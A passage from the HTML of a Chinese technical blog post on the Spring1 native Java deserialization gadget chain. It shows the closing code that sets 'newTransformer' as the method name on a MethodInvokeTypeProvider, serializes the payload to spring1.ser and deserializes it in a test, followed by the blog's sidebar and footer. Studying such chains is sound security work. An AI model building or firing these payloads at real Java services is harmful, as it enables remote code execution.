class="literal">true</span>);</span><br><span class="line">        methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(methodInvokeTypeProvider);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;spring1.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br/>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/" title="SpringBoot第二部分"><img class="cover" src="/img/SpringBoot.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">SpringBoot第二部分</div></div><div class="info-2"><div class="info-item-1">Mybatis是作用于持久层的的框架，主要与数据库进行交互，可以简化程序编写时与数据库的交互</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">楽依</div><div class="author-info-description">救救菜鸡Orz</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lenonline2021-source"><i class="fab fa-github"></i><span>Github</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">Spring1原生反序列化链</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" title="Spring1原生反序列化链"><img src="/img/post13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring1原生反序列化链"/></a><div class="content"><a class="title" href="/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" title="Spring1原生反序列化链">Spring1原生反序列化链</a><time datetime="2026-01-03T04:30:35.000Z" title="Created 2026-01-03 12:30:35">2026-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/" title="SpringBoot第二部分"><img src="/img/SpringBoot.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SpringBoot第二部分"/></a><div class="content"><a class="title" href="/2026/01/02/SpringBoot%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/" title="SpringBoot第二部分">SpringBoot第二部分</a><time datetime="2026-01-02T08:49:35.000Z" title="Created 2026-01-02 16:49:35">2026-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/" title="SpringBoot第一部分"><img src="/img/SpringBoot.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SpringBoot第一部分"/></a><div class="content"><a class="title" href="/2025/12/31/SpringBoot%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/" title="SpringBoot第一部分">SpringBoot第一部分</a><time datetime="2025-12-31T07:49:03.000Z" title="Created 2025-12-31 15:49:03">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/" title="SpringMVC第二部分"><img src="/img/SpringMVC.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SpringMVC第二部分"/></a><div class="content"><a class="title" href="/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/" title="SpringMVC第二部分">SpringMVC第二部分</a><time datetime="2025-12-30T13:06:22.000Z" title="Created 2025-12-30 21:06:22">2025-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/" title="SpringMVC第一部分"><img src="/img/SpringMVC.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SpringMVC第一部分"/></a><div class="content"><a class="title" href="/2025/12/29/SpringMVC%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/" title="SpringMVC第一部分">SpringMVC第一部分</a><time datetime="2025-12-29T12:46:03.000Z" title="Created 2025-12-29 20:46:03">2025-12-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #757575;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 楽依</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text">你已经抵达世界尽头啦~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script>
+  // 页面加载完成后隐藏动画
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      const loadingEl = document.getElementById('custom-loading');
+      if (loadingEl) {
+        loadingEl.style.opacity = '0';
+        setTimeout(function() {
+          if (loadingEl.parentNode) {
+            loadingEl.remove();
+          }
+        }, 500);
+      }
+    }, 1000);
+  });
+</script>
+<script async data-pjax src="/"></script></div></body></html>
